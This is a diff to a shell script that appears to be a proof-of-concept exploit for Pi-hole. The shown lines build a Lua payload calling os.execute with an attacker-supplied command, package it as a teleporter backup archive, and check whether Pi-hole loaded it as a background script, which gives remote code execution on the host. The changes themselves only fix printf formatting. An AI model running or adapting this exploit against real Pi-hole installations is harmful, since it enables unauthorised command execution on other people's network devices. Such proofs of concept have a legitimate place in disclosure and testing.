@@ -23,7 +23,7 @@ fi
 
 # Create crafted teleport file to stage the Lua script
 # (can also skip this and just stage it locally if you have ssh access)
-printf "os.execute(\"${CMD}\")" > dhcp.leases
+printf "os.execute(\"%s\")" "$CMD" > dhcp.leases
 tar -zcf teleport.dhcp.tar.gz dhcp.leases
 
 # POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
@@ -45,7 +45,7 @@ resopts="$( echo "${res}" | jq -r ".config.webserver.advancedOpts.[0]" )"
 if [ "${resopts}" == "lua_background_script=/etc/pihole/dhcp.leases" ];then
   echo "[+] pihole loaded our config, check for exec result on pihole host"
 else
-  printf "[-] pihole did not set our config options.\n[-] config.webserver.advancedOpts: ${resopts}\n[-] full response: ${res}\n"
+  printf "[-] pihole did not set our config options.\n[-] config.webserver.advancedOpts: %s\n[-] full response: ${res}\n" "$resopts"
 fi
 
 exit 0
